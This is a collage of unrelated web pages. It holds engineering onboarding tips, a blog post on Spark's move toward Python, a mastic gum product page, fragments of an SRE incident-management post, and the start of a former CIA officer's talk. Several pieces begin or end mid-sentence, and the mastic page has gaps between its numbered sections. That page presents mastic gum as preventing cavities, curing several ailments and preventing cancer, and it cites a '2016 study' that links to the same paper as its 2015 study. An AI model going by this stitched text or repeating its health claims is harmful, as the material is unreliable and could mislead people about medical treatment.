<p>It can be a bit daunting to ping someone with a question that feels stupid to ask even if it is not. A dedicated buddy on the new team makes it easier to figure out the correct point of contact for your questions. A buddy can help understand communication dynamics within and across the teams, help understand the company/ team abbreviations &amp; acronyms, guide you on your tasks, etc.</p>

<h3 id="6-ask-questions-a-lot-of-them">6. Ask questions.. A lot of them</h3>

<p>Your imposter syndrome sure will not kick in until the first week or two. Maybe it won’t kick in at all. But if you are venturing out for something new, more often it does. A great tip for dealing with this is to be fearless and ask questions (<em>again..there are no stupid questions..</em>). The more you can familiarize yourself with the new team, the project, and the business, the better. It may not all make sense to you all at once but keep notes. Eventually, it will all come together.</p>

<p>It also helps to schedule regular 1:1s with members of your team and driving the agenda on things you wish to understand in the project.
Another great way to learn fast is to shadow experienced team members on tasks, understand their thought process, watch them debug issues, understand their communication style.</p>

<h3 id="7-read-the-documentation-and-code">7. Read the documentation and code</h3>

<p>The best way to learn is to read the documentation and code. The information you have heard from your teammates will now start making more sense. Additionally, this will help you recognize potential improvements in the documentation/ codebase for future contributions.</p>

<h3 id="8-contribute">8. Contribute</h3>

<p>The best way to learn is to do. Nothing beats the feeling of your first commit in the new project- be it a bug fix, a small feature enhancement, documentation improvements, etc. Channel your doer mindset and look for ways to make things better.</p>

<h3 id="9-seek-feedback">9. Seek feedback</h3>

<p>In a loop of continuous improvement, nothing triumphs feedback. Seek constructive feedback from your manager, your teammates on what you did better and what are your blind spots. Where can you improve as well as discuss what challenges you are facing and how can you address them?</p>

<p>Good feedback is a two-way conversation. Not only should you receive feedback but also provide it. Be open to sharing what you learned through the onboarding process, what can potentially improve for the future, how did your team members help you feel comfortable with the process, etc.</p>

<h2 id="conclusion">Conclusion</h2>
<p>Owning your onboarding can contribute to your success in the role and can bring joy. <img title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"> <img title=":chart_with_upwards_trend:" alt=":chart_with_upwards_trend:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f4c8.png" height="20" width="20"> I hope these tips and ideas can help new engineers navigate the onboarding successfully.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
<p>I watched (COVID19-era version of “attended”)  the<a href="https://databricks.com/sparkaisummit"> latest spark Summit</a> and in one of the keynotes Reynold Xin from  Databricks, presented the following two images comparing spark usage on their platform on 2013 vs. 2020:</p>



<figure><img loading="lazy" src="https://arnon.me/wp-content/uploads/image-3-983x1024.png" alt="" width="645" height="671"></figure>



<figure><img loading="lazy" width="1024" height="947" src="https://arnon.me/wp-content/uploads/image-4-1024x947.png" alt=""></figure>



<p>While Databricks’ platform is, of course, not the whole spark community, I would wager that they have enough users to represent the overall trend.</p>



<p>Incidentally, the same trends are also happening outside of the Spark world with SQL re-installing itself as the standard to access data, on traditional RDBMSs, so called “NoSQL” databases (that are getting SQL  dialects) and NewSQL offerings. As for Python it is definitely  the go-to language for machine-learning (we’ll see if <a href="https://julialang.org/">Julia</a> will be able to dethrone it) </p>



<p>Anyway, back to spark, considering these numbers it comes as no surprise that a lot of the efforts that are coming from Databricks are diverging away from Scala and making much more investment in Python: </p>



<ul><li><a href="https://koalas.readthedocs.io/en/latest/" target="_blank" rel="noreferrer noopener">Koalas</a> – which is an attempt similar to <a href="https://dask.org/" target="_blank" rel="noreferrer noopener">Dask</a> i.e. trying to replicate pandas API on a distributed engine. </li><li><a href="https://databricks.com/blog/2020/09/04/an-update-on-project-zen-improving-apache-spark-for-python-users.html">Project Zen</a> – improving the PySpark developer experience </li></ul>



<p>I have to say, that in my opinion,  these two initiatives are crucial for Spark to remain relevant for python development. I have an anecdotal example from  a couple of years ago. I worked in a company where we developed predictive models that provide early alerting for medical deteriorations in ICU patients (the respiratory failure  model was <a rel="noreferrer noopener" href="https://www.fdanews.com/articles/197491-fda-clears-clew-medicals-screening-software-for-covid-19-patients" target="_blank">FDA approved during COVID-19</a>). Since I had a lot of good experience with Spark (on JVM) we started out with PySpark and integrated it with our pandas based feature building (both medical oriented and data science oriented) that look at patient hospitalization time-series data. We got all that to work with Spark but, the cryptic error message and the problematic memory tuning, with two runt-times JVM and python passing data back and forth, drove us to replace this with a new solution we built using Dask. That solution  was both easier to work with and used less resources.</p>



<p>The other thing Spark needs to stay relevant, is to provide a good dev experience for deep learning projects. <a rel="noreferrer noopener" href="https://deeplearning4j.konduit.ai/distributed-deep-learning/howto" target="_blank">DeepLearning4J can work with Spark</a>, but I think we already established that’s not where spark is heading, nor where ML innovation is happening.  The more interesting work on adding Deep-learning to Spark  is “project Hydrogen”.</p>



<p>“Project Hydrogen’ is an on-going effort since spark 2.4. It still has some way to go but it already yielded interesting changes like <a rel="noreferrer noopener" href="https://developer.nvidia.com/blog/optimizing-and-improving-spark-3-0-performance-with-gpus/" target="_blank">spark on GPUs</a> and<a rel="noreferrer noopener" href="https://issues.apache.org/jira/browse/SPARK-24374" target="_blank"> barrier scheduler</a> . Barrier scheduler is particularly interesting as it is an additional execution scheduler that is <strong>not map/reduce</strong> and more aligned with MPI  (there are good explanations <a href="http://blog.madhukaraphatak.com/barrier-execution-mode-part-1/">here</a> and <a rel="noreferrer noopener" href="https://www.waitingforcode.com/apache-spark/apache-spark-2.4.0-features-barrier-execution-mode/read" target="_blank">here</a>).  This enables things like <a rel="noreferrer noopener" href="https://docs.databricks.com/applications/machine-learning/train-model/distributed-training/horovod-runner.html" target="_blank">HorovodRunner</a> and<a rel="noreferrer noopener" href="https://github.com/tensorflow/ecosystem/tree/master/spark/spark-tensorflow-distributor" target="_blank"> better integration with TesorFlow</a> (better vs. <a rel="noreferrer noopener" href="https://github.com/yahoo/TensorFlowOnSpark" target="_blank">Yahoo’s TensorFlowOnSpark</a>) as can be seen in the example code (posted on the repo):</p>

<p>Lastly, if python is taking center-stage, the whole JVM (Scala in this case) is becoming more of a nuisance Spark needs to tag along vs.  the advantage it used to be (and still is in many use cases – but we’re talking trends here). Indeed, in a couple of other session on the Spark summit, Databricks talked  about  the Photon execution engine (depicted below)  they are currently developing and is<a href="https://techcommunity.microsoft.com/t5/analytics-on-azure/turbocharge-azure-databricks-with-photon-powered-delta-engine/ba-p/1694929"> available on Azure Databricks </a>. According to the “brochure” it brings 20x performance improvement over spark 2.4 – this was done by reimplementing Spark’s engine in C++ and  I don’t know if this would become open-source or not ,I am not even sure if this is the beginning of the end or just the end of the beginning for spark – I am sure it is a big deal.  One other sure thing these changes in spark are bad news for Scala (but that’s for another post :) )</p>

<p><strong>M</strong>astic gum is resin&nbsp;from&nbsp;the Mastic tree found on the Greek island Chios. It's been labelled as a superfood because of its numerous health&nbsp;properties- which we'll talk about in just a bit.&nbsp;</p>
<p>&nbsp; &nbsp;But in the last 5 years its popularity has skyrocketed for&nbsp;a reason no Greek farmer could have ever expected.&nbsp;</p>
<h3><strong><em>It can sharpen your jawline</em></strong></h3>
<p>&nbsp; &nbsp;People are catching on to an old BodyBuilder method for building muscle in the jawline- chewing mastic gum! Because it's 10x harder than regular gum it's basically like taking your jaw to the gym.</p>
<p>&nbsp; &nbsp;Apparently this is relatively well-known in Hollywood and the BodyBuilding space. Now it's&nbsp;making its way into the mainstream. More on that later. First you've got to understand where it comes from to know why it's so special:</p>

<meta charset="utf-8">
<p><img src="https://cdn.shopify.com/s/files/1/0340/7226/4840/files/mastic-gum-from-chios_copy_480x480.jpg?v=1607283243" alt="Mastic gum from chios"></p>
<p><em>Mastic gum from the Greek island Chios</em></p>


<meta charset="utf-8">

<meta charset="utf-8">
<p><strong>T</strong>he people of Chios have&nbsp;cultivated and harvested mastic or "Mastiha" for over 2500 years. The hot and humid climate is ideal for the 6-month, laborious process.</p>

<p><img src="https://cdn.shopify.com/s/files/1/0340/7226/4840/files/mastic-gum-from-chios_0706dfc7-3e37-472b-9669-5ec2e9f92bad_480x480.jpg?v=1607283273" alt="Farmers harvesting chios resin"></p>
<p><em>Farmers harvesting Mastic on the Greek island Chios</em></p>

<meta charset="utf-8">
<p>&nbsp; &nbsp;Every 4-5 days, several&nbsp;cuts are made in the trees to slowly drain the resin. It takes roughly 15-20 days for the crystal to solidify and fall off. Because of the way it falls from the tree and it's shape, these small pieces of resin are called "Tears of Chios". The farmers then collect these small teardrops and wash them in natural spring water.</p>
<meta charset="utf-8">
<h3><strong>It&nbsp;has a refreshing pine/cedar flavour.</strong></h3>



<p><strong>M</strong>astic's earliest identified uses was as chewing gum- the additional benefits were yet to be discovered.</p>
<p>&nbsp; &nbsp;Mastic producing villages&nbsp;were fortresses,&nbsp;bordered by huge walls. The only way to enter these villages was by ladder, designed to shield the resin from invaders.</p>
<p>I'm not exaggerating when I say: <span><a href="https://en.wikipedia.org/wiki/Chios_massacre"><strong>wars were fought over mastic gum</strong></a>.</span></p>
<p>&nbsp; &nbsp;During the Ottoman rule of Chios in the 1800s, mastic was <strong>worth its weight in Gold.&nbsp;</strong>In todays gold prices that means 1 piece would cost $59.14</p>
<p>&nbsp; &nbsp;Luckily for us, it doesn't cost that much. But with its growing popularity, maybe someday it might. Let's talk about <em>why </em>it's selling out around the world:</p>



<p><strong>T</strong>he ancient Mediterraneans loved mastic and thought it had "magic" healing properties. Thanks to modern science we know today how that "magic" works. Here's the 7 main health benefits we use it for today:</p>
<ol>
<li><strong><a href="#dental">Aids Dental Health</a></strong></li>
<li><strong><a href="#inflammation">Anti-Inflammatory</a></strong></li>
<li>
<strong><a href="#cholesterol">Lowers Cholesterol &amp;</a></strong><strong>&nbsp;Blood Sugar</strong>
</li>
<li><strong><a href="#biotic">Anti-Biotic&nbsp;/ Anti-Fungal</a></strong></li>
<li><strong><a href="#digestion">Soothes Digestion &amp; Heartburn</a></strong></li>
<li><strong><a href="#cancer">Cancer Preventative</a></strong></li>
<li><strong><a href="#asthma">Asthma Treatment</a></strong></li>
</ol>

<h3><b>Here's The "Magical" Ingredients (Skip If Boring)</b></h3>
<meta charset="utf-8">
<p><span>Mastic gum is composed of several bioactive compounds responsible for its numerous health benefits. These include <em>triterpenic acids</em> (TAs) such as <em>isomasticadienolic acid</em> as well as triterpenes. These are natural antibiotics that also act as strong anti-inflammatories.</span></p>
<p><span>&nbsp; &nbsp;Mastiha naturally&nbsp;contains large percentages of organic compounds like Terpenoids, which add to its aromatic element. The main active Terpenoids include&nbsp;<em>alpha-pinene</em> (40%), <em>beta-myrcene</em>, <em>beta-pinene</em>, <em>limonene</em>, and <em>beta-caryophyllene</em>.&nbsp;</span></p>
<p><span>&nbsp; &nbsp;<em>Alpha-pinene</em> is also found in pines and rosemary. It's what gives Mastic a fresh pine/cedar flavor.&nbsp;As well as providing a strong woody aroma, it's also a potent topical antiseptic. </span></p>
<p><span>&nbsp; &nbsp;Unlike regular chewing gums, which are</span><span>&nbsp;filled with artificial coloring and flavors, <strong>mastic gum&nbsp;is 100% natural.</strong></span></p>


<h2 id="dental"><span>1. Aids Dental Health (Prevent Cavities)</span></h2>
<meta charset="utf-8">
<p><strong>T</strong>here are&nbsp;multiple studies about Mastic gum and its positive effect on dental health.&nbsp;A <span><a href="https://meridian.allenpress.com/angle-orthodontist/article/77/1/124/58081/Short-term-Effect-of-Mastic-Gum-on-Salivary">2007 study</a>&nbsp;</span>found that chewing&nbsp;mastic gum may potentially help prevent teeth cavities by&nbsp;reducing bacteria in the mouth and the pH of saliva.</p>

<p><img src="https://cdn.shopify.com/s/files/1/0340/7226/4840/files/Tooth-decay-diagram_b8ee88bd-931a-4d5d-b51e-ad0d796e9211_480x480.jpg?v=1607283312" alt="Diagram of tooth decay"></p>
<p><em>Mastic gum has been shown to reduce the build-up of plaque</em></p>

<p><span>&nbsp; &nbsp;After chewing mastic gum for 15 minutes, participants in the study were found to have lower levels of&nbsp;</span><em>lactobacilli</em> and <em>S Mutans</em> in the oral cavity. The rate of bacteria levels even remained low even 2.25 hours later. This same effect was further supported by&nbsp;a&nbsp;<span><a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4281189/">2014 study</a></span>.</p>
<p>What this means for you is:</p>
<h3><strong>Mastic Gum Prevents Cavities And Bad Breath</strong></h3>
<meta charset="utf-8">
<p>&nbsp; &nbsp;There's no need to worry about chewing a random resin that came from a tree in Greece- it's recommended by dentists!</p>
<p>Just chew it&nbsp;like a regular piece of gum and chuck it when you're done.&nbsp;</p>
<p><em><strong>WEIRD FACT:&nbsp;</strong>you can swallow mastic gum! It can be broken down by your stomach like any other food because it's 100% natural.</em>&nbsp;</p>


<meta charset="utf-8">
<h2 id="inflammation"><strong>2. Anti-Inflammatory (Heal Faster)</strong></h2>

<span>3.&nbsp;Lower Cholesterol &amp; Blood Sugar&nbsp;</span>(Healthier Heart)</h2>
<meta charset="utf-8">
<p><span><strong>O</strong>ur modern lazy-lifestyles and unnatural diet have made high cholesterol and high blood sugar levels commonplace. These two things increase the risk of heart disease and type 2 diabetes. Some studies suggest that chewing mastic gum could help&nbsp;restore these levels.</span></p>
<p>&nbsp; &nbsp;A <span><a href="https://journals.sagepub.com/doi/abs/10.1177/2047487315603186">2015 study</a></span>&nbsp;conducted&nbsp;<span>with</span>&nbsp;156 healthy individuals found that daily mastic consumption lead to lower total cholesterol levels. These results were observed after 8 weeks.</p>
<meta charset="utf-8">
<p>&nbsp; &nbsp;In a <span><a href="https://journals.sagepub.com/doi/10.1177/2047487315603186">2016&nbsp;study</a></span>, people who took mastic&nbsp;in some form also experienced lower blood glucose levels which are&nbsp;sometimes associated with high cholesterol levels. Mastic was found to have&nbsp;a greater effect on people who are overweight or obese.</p>


<meta charset="utf-8">
<h2 id="biotic"><strong>4. Anti-Biotic / Anti-Fungal (Good For Everything)</strong></h2>
<meta charset="utf-8">
<p><strong>B</strong>alancing our body's bacteria is a crucial function of our diet. Mastic has anti-fungal and anti-inflammatory properties that&nbsp;serve as a&nbsp;cure for several ailments.</p>

<h3>Soothing Stomach Ulcers</h3>
<meta charset="utf-8">
<p><span>Mastic&nbsp;has been shown to&nbsp;help in treating symptoms of peptic ulcers (stomach ulcers).</span></p>
<p>&nbsp; &nbsp;A well-known <span><a href="https://onlinelibrary.wiley.com/doi/abs/10.1111/j.1440-1681.1984.tb00864.x">study</a>&nbsp;</span>conducted in 1984 on 38 people demonstrated that 1 gram of mastic gum taken daily, results in reduction of ulcer symptoms in less than 2 weeks.</p>

<h3><strong>Reducing Helicobacter Pylori Bacteria In The Stomach</strong></h3>
<p><span>Helicobacter pylori bacteria infections are a major risk factor that can contribute to stomach ulcers. If left unchecked, t</span>hese bacteria&nbsp;may potentially lead to stomach cancer.</p>
<p>&nbsp; &nbsp;Mastic gum's antibacterial capabilities against&nbsp;<i><span>H. pylori </span></i>have been shown to mitigate these risks. A<span> <a href="https://www.sciencedirect.com/science/article/abs/pii/S0944711309002396?via%3Dihub">study</a></span>&nbsp;from 2010, found that mastic gum destroyed&nbsp;H. pylori colonies faster than a placebo in a 14 day period.</p>


<meta charset="utf-8">
<h2 id="digestion">
<strong>5.&nbsp;</strong><strong>Soothes Digestion &amp; Heartburn</strong>
</h2>
<meta charset="utf-8">
<p><span><strong>M</strong>astic gum's most common use (for health purposes) throughout history has been as a cure for digestive problems.</span></p>
<p>&nbsp; &nbsp;One<span> <a href="https://onlinelibrary.wiley.com/doi/abs/10.1111/j.1440-1681.1984.tb00864.x">study</a></span> found that 1g of mastic gum a day, led to fewer stomach aches and heartburn in volunteers. If you read <span><a href="https://www.amazon.com/s?k=mastic+gum&amp;ref=nb_sb_noss_2">Amazon</a></span> reviews for Mastiha and mastic gum, you will find hundreds of cases where it has cured men and women's ulcers and digestion problems:</p>

<p><em>Mastic gum is an almost "magical" cure for stomach ulcers&nbsp;&nbsp;</em></p>

<h3>Helps Inflammatory Bowel Disease (IBD)</h3>
<p>New research presented in <span><a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4367210/">2015 review</a></span> suggests that mastic gum can help with inflammatory bowel diseases (IBD), including Crohn’s disease.&nbsp;</p>
<p><span>&nbsp; &nbsp;A study conducted on 60 people with IBD found that individuals who consumed mastic in any form had&nbsp;measurable improvements in their IBD inflammation markers such as&nbsp;</span><span>decreased levels of IL-6 and C-reactive protein. This was over a 3 week period.</span></p>


<meta charset="utf-8">
<h2 id="cancer"><strong>6.&nbsp;Cancer Preventative</strong></h2>
<p><span><strong>R</strong>esearchers</span>&nbsp;are currently investigating mastic gum’s role in inhibiting the growth of prostate cancer. According to a<a href="https://acsjournals.onlinelibrary.wiley.com/doi/full/10.1002/cncr.21935"><span>&nbsp;</span><span>2006 study</span>,</a> mastic gum can inhibit an androgen receptor that could have an effect on the development of prostate cancer.</p>
<p>&nbsp; &nbsp;Mastic&nbsp;has been shown to weaken the function of the androgen receptor in&nbsp;these&nbsp;cancer cells. More recent<span>&nbsp;<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4951764/"><span>laboratory studies</span></a></span><span>&nbsp;have uncovered more about how this effect works.</span></p>
<p><span>&nbsp; &nbsp;<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5476564/">Research from 2017</a>&nbsp;</span>suggests that mastic&nbsp;may also help suppress the growth of tumors that can lead to colon cancer. Researchers found that mastic inhibited the increase of colon cells. It has been show to&nbsp;inhibit the growth of colon carcinoma tumors.</p>


<meta charset="utf-8">
<h2 id="asthma"><strong>7. Asthma Treatment</strong></h2>
<meta charset="utf-8"><meta charset="utf-8">
<p><strong>M</strong>astic gum's anti-inflammatory properties may make it useful in treating<span>&nbsp;allergenic asthma</span>. This type of asthma often includes airway inflammation, eosinophilia, and airway hyper-responsiveness.</p>
<p>&nbsp; &nbsp;In a<span>&nbsp;<span><a href="https://www.atsjournals.org/doi/full/10.1165/rcmb.2010-0212OC">2011 study</a></span></span><span>&nbsp;conducted&nbsp;</span>on mice, mastic gum significantly inhibited eosinophilia, reduced airway hyper-responsiveness, and blocked the production of inflammatory substances. It had a positive effect on lung fluid and lung inflammation. In vitro tests found that mastic gum inhibited cells that react negatively to allergens and cause airway inflammation.</p>
<p>&nbsp; &nbsp;These results are promising but further studies are needed to determine efficacy in human cases.</p>


<meta charset="utf-8">

<p><span><strong>G</strong>enerally well-tolerated and 100% natural, mastic and&nbsp;doesn't have any major reported side effects. </span></p>
<p><span>&nbsp; &nbsp;In some rare cases, it may cause dizziness, headache, or an upset stomach. These cases are likely due to increased tension in the muscles surrounding your skull because mastic gum is so much harder than what we are accustomed to chewing.</span></p>
<p><span>&nbsp; &nbsp;<strong>Start with a small quantity and see how your body reacts to it</strong>.&nbsp; Once you're sure there's no&nbsp;negative&nbsp;effects you can gradually increase the dose.&nbsp;</span></p>
<p><span>&nbsp; &nbsp;It's always possible to have an allergic reaction to something new</span><span>. So monitor how you feel and consult a doctor if you're concerned.</span></p>
<meta charset="utf-8">
<p><span>You shouldn’t take mastic gum if you’re pregnant or breastfeeding.</span>&nbsp;</p>

However, I had never been oncall before I joined Linkedin and the impact of a system outage that affects thousands of engineers made the first week of oncall pretty overwhelming.</p><p><img src="https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/then-with-caption.gif" alt="first week of me handling production issues"></p><p>But things got better overtime.</p><p>In this post, I would like to share the incident management practices I have picked up over the years as an SRE at Linkedin that help me keep calm under pressure and effectively drive incidents to resolution.</p><p><img src="https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/now-with-caption.gif" alt="present me handling production issues"></p><h2 id="what-this-post-is-not-about">What this post is not about</h2><p>In this post, I am not going to talk about how to debug linux or distributed systems or the various debugging tools.

I was meeting smart engineers and learning new things. It wasn’t until my first oncall rotation that I started thinking <em>what if there’s an outage and I need to fix it?</em></p><p><img src="https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/anxious.gif" alt="anxiety before first week of oncall"></p><p>Now, don’t get me wrong. LinkedIn has really good systems in place for monitoring/alerting, triaging issues and a very well defined process for incident response. Those are absolutely critical. And to prepare, I had shadowed our oncall the week prior and even had an experienced team member shadow me to guide and help me out, but still, I was anxious.</p><p>Here’s what I wish I had known.</p><ul><li><a href="#before-oncall-starts">Before oncall starts</a><ul><li><a href="#oncall-handoff">Oncall handoff</a></li><li><a href="#organizing-slack-during-an-oncall-week">Organizing Slack during an oncall week</a></li></ul></li><li><a href="#signal-vs-noise">Signal vs Noise</a><ul><li><a href="#trust-but-verify---not-all-alerts-are-created-equal">Trust, but verify - not all alerts are created equal</a></li><li><a href="#declaring-an-incident">Declaring an incident</a></li></ul></li><li><a href="#communication-during-an-incident">Communication during an incident</a><ul><li><a href="#the-incident-title-and-scoping-the-impact">The incident title and scoping the impact</a></li><li><a href="#establish-communication-channels-and-an-incident-lead">Establish communication channels and an incident lead</a></li><li><a href="#communicate-changes-to-the-system">Communicate changes to the system</a></li><li><a href="#provide-regular-updates">Provide regular updates</a></li></ul></li><li><a href="#incident-response-is-a-collaborative-process">Incident response is a collaborative process</a><ul><li><a href="#get-help-early">Get help early</a></li><li><a href="#working-with-others">Working with others</a></li><li><a href="#video-conferencing-is-your-friend">Video conferencing is your friend</a></li></ul></li><li><a href="#towards-a-resolution">Towards a resolution</a><ul><li><a href="#looking-at-changes">Looking at changes</a></li><li><a href="#keep-calm-and-carry-on---one-step-at-a-time">Keep calm and carry on - one step at a time</a></li></ul></li><li><a href="#learning-from-the-incident">Learning from the incident</a></li></ul><h2 id="before-oncall-starts">Before Oncall Starts</h2><h3 id="oncall-handoff">Oncall handoff</h3><p>Before an oncall week starts, I talk to the person who is currently oncall to get context on any incidents that happened during the week or any weird bugs that were discovered in our stack. It gives me perspectives on issues that could be getting carried over from the previous week and any critical changes I should be aware of.
Although you can’t plan for all that happens during an oncall week, a proper handoff helps you prepare for it.</p><h3 id="organizing-slack-during-an-oncall-week">Organizing Slack during an oncall week</h3><p>As an SRE on LinkedIn’s container scheduler and deployment infrastructure team, our users are engineers at LinkedIn. We use Slack for internal communication and we have certain channels where users share issues they are experiencing with the tooling or to get our oncall’s attention. During an oncall week, I star these channels and organize my sidebar so that I can easily notice messages from our users and distinguish them from the other messages I receive. As an optional tip - I also like to mute/leave channels that I am not actively participating in to reduce clutter.</p><p>As compared to a normal week, I spend more time on Slack when I am oncall - responding to people, answering support requests, helping users with tooling. These Slack notifications can create a little bit of distraction, however, considering all our users are internal, a rise in messages on our channels can also indicate that something might be wrong with our system and our alerting hasn’t caught it yet.</p><p><img src="https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/slack-pings.gif" alt="slack pings during oncall"></p><h2 id="signal-vs-noise">Signal vs Noise</h2><h3 id="trust-but-verify---not-all-alerts-are-created-equal">Trust, but verify - not all alerts are created equal</h3><p><img src="https://ronaknathani.com/blog/2020/11/what-i-wish-i-knew-about-incident-management/trust-but-verify-you-must.jpg" alt="trust-but-verify-you-must"></p><p><i>This is something I learned during my interview at LinkedIn and it has been very applicable in my experience since.</i></p><p>In early days of oncall and incident management, it is very common to feel as if things are on fire when any alert gets triggered. Over time, I have realized that gaining context and verifying that the alert is actually indicating an issue helps with the right next steps. It is important to distinguish signal from noise because:</p><ul><li>An alert could be non-actionable as it was recently configured with a threshold that’s making it too noisy</li><li>The monitoring stack is down and the alert is being triggered because the configuration treats a lack of data points as an issue</li><li>Your service is operating perfectly fine, however, the traffic tier routing requests to your service had an issue</li><li>Timer on a deliberately silenced alert expired and the alert started triggering</li></ul><p>I have experienced all of the above at some point in time. Now when I either receive an alert or a user reports an issue, I check our services (metrics, logs, reproduce the reported problem etc.) to verify that the issue is real.</p><h3 id="declaring-an-incident">Declaring an incident</h3><p>Not all actionable alerts result in an incident. To be effective at identifying the ones that do, it is extremely crucial to think about the bigger picture of mitigating the issue than be overwhelmed by the technical task of resolving the alert.</p><p>Some of the qualitative measures that help make this differentiation is to consider whether an issue requires coordinating the fix with other teams or whether the issue is impacting customers or violating an SLO. If any of the conditions are true, declare an incident. It is always better to declare an incident early in the process than waiting too long.</p><p>At LinkedIn, we have defined guidelines for all teams about what warrants an incident along with different levels of severity. This takes guesswork out of the picture, and provides a shared understanding to every team member.</p><h2 id="communication-during-an-incident">Communication during an incident</h2><h3 id="the-incident-title-and-scoping-the-impact">The incident title and scoping the impact</h3><p>Every incident gets a title. I didn’t realize it initially, but giving an incident a title forces one to define the problem and communicate it to the stakeholders very succinctly. When communicating to stakeholders, <strong>scoping the incident is very important</strong>. What I mean by scoping is identifying how big the impact is - which environment is impacted, is the impact limited to a region or is it global, how many customers are impacted, etc. For instance, “the login feature on the site is not working” vs “the login feature on the site is not working for traffic originating from Asia Pacific” say two very different things.</p><h3 id="establish-communication-channels-and-an-incident-lead">Establish communication channels and an incident lead</h3><p>We heavily rely on Slack to communicate during an incident. A dedicated slack channel helps focus all the energy and inputs from everyone in one place. It helps the incident lead collect data about symptoms that the users are experiencing and also captures a log of considered/discarded hypotheses and any changes made to the system. Once the Slack channel is created, establish an incident lead and let everyone know who is driving the incident forward.</p><p>Eslablishing explicit comms channels for reporting and identifying issues and establishing an incident lead reduce the delay in action and disambiguate any confusion.</p><h3 id="communicate-changes-to-the-system">Communicate changes to the system</h3><p>If there’s a fix you’d like to try out, let others know who are and encourage everyone to do the same. This ensures that the potential fix doesn’t make an already bad situation worse and helps catch any blind spots early. If you do end up making a change to the system after getting consensus, let others know and follow up on its effects.</p><h3 id="provide-regular-updates">Provide regular updates</h3><p>While working towards a resolution for the incident, it is very easy to get overwhelmed by the technical details and miss to communicate an update. This leads to angry leadership and annoyed customers who have no insight into what’s happening.</p><p>An update provides visibility to the customers that the issue is being worked upon and lets the leadership identify if they can help out with anything. Depending on the severity of the incident, an update every 15-30 mins serves pretty well. The update doesn’t have to be extremely detailed, rather a brief summary describing the current state and immediate next steps is sufficient. An example update:</p><blockquote><p><strong>[UPDATE]</strong> Our hypothesis about the memory leak checks out and we have validated the fix in the staging environment. We have pushed out the change and as soon as it goes through the CI pipeline, we’ll canary the new release, monitor metrics and promote the change after verifying the fix.</p></blockquote><h2 id="incident-response-is-a-collaborative-process">Incident response is a collaborative process</h2><h3 id="get-help-early">Get help early</h3><p>In my earlier days, I used to think that it was solely my responsibility to mitigate the issue, find the root cause, and roll out the fix. If I couldn’t do it, it wouldn’t reflect well on me. In reality, incident management, like much of software development, is a very collaborative process.</p><p>One of the big differences in how I approach it now is I focus on actively pulling in other engineers who could help with debugging or resolving the issue early in the process. This change in perspective has relieved me of a lot of unnecessary stress and also made me more effective at resolving incidents.</p><p>When requesting help, be specific about the task as well as the urgency. It helps others calibrate their response and manage things they might have at hand.</p><h3 id="working-with-others">Working with others</h3><p>One of the most important things while handling incidents is working with others.

One should be cautious about going down any rabbit holes and focus on stopping the bleeding first. If there’s a probable cause, share it early - it helps rule out possibilities. And it’s okay to ask questions that seem obvious, but specific questions are more helpful.</p><p>Being fearlessly curious, and keeping an open mind enables one to consider possibilities that could be overseen otherwise.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-bolt-field="body"><p><iframe allowfullscreen="" frameborder="0" src="https://www.youtube.com/embed/BDZv57p1Ixk"></iframe></p>



<p><b>Ralph W. McGehee:</b> It's a real honor for me to be here today. I don't often say that, but I really mean it. I like to start off my talk by mentioning two things. One, please don't believe anything I'm going to tell you. The American people are so inundated by misinformation, there's absolutely no reason you should believe anything anybody tells you, particularly the evening news. Of course, with everything there is an exception, and I think in my case, I have a fairly valid exception. Because of the process that I had to go through to clear my book, I had to prove that everything I am saying is in the public domain. I still go down to the Agency about twice a month and turn in new material to let them clear it. And in doing that process, I have to produce or pull out from government documents that particular information, because they inevitably will say, "You can't say it, it's classified." And I will inevitably locate that information in the public domain.</p> 
 
<p>So if you doubt me, and I hope you will, there is a way to check up on me. Go to the library and look in the back of my book, and almost every major conclusion that I will be talking about here today will be documented to an official government document. I've drawn upon the Pentagon Papers. Are you all familiar with the Pentagon Papers? And the Senate and House investigations of the Agency and a variety of other material. So don't believe what I say, but if you want to check up on me, the information is available.</p> 
 
<p>Secondly, I'd like to say my message is basically a real downer. It is real negative, but I don't want to leave you with that impression, because I just returned from a two week speaking trip in Iowa, where I was going to testify at the court case there in Iowa City for the protesters, and in Nebraska. And I've been in Arizona and various other places speaking, and wherever you go, you find concerned groups. So I am encouraged. I know during the Vietnam War for the first ten years, we didn't even know what was going on. And then eleven or twelve years later, people began to protest. But this time in Latin America, the protest was almost instantaneous. The substructure is there. The only reason we got out of Vietnam, of course, is because of the student protests. So I am very encouraged. My message is negative, but I don't want to leave you with that impression. I am very, very encouraged.</p> 
 
<p>I think I should talk in three basic phases. One, walk you very quickly through my career with the Agency up to right now where I am today, and back up and walk you through Vietnam a little bit or walk you through my career in a little more detail, including Vietnam. Now I do that not to talk about Vietnam but because the processes that are followed today in Central America, in the Middle East and in Africa have all been used in Vietnam. I'll take out three or four incidences, and they are documented by the way, and show you that these are sort of typical of what the Agency does around the world since the very beginning in '47, what it's doing today in '86.</p> 
 
<p>Then I'll go back and review the Agency's domestic operations, and I'll do that for one purpose, because everything they were doing up to the mid-seventies they are now doing again. The only difference now is under President Reagan's Executive Order 12333 of December '81, they can do the things legally that they were doing illegally before. It's the only difference. Then I would like to talk, sort of bring it all together in Central America and talk about El Salvador, Grenada, and particularly Nicaragua, and then come to my conclusion. So that's basically the approach I'll take.</p> 
 
<p>I went to the University of Notre Dame. I played on four undefeated football teams, three national championships, and then I tried out with the Green Bay Packers. And to this day, I can't understand what's the matter with the coaches up there. When I was cut, I received a cable, "Would you be interested in an important government position similar to the State Department in function?" My football background was not irrelevant. When I went down to Washington, I found that the class before me, my class, and the class after me were basically rejects from the National Football League, not the standard concept of an intelligent (He does say "intelligent" here, I think as a joke about football players) officer.</p> 
 
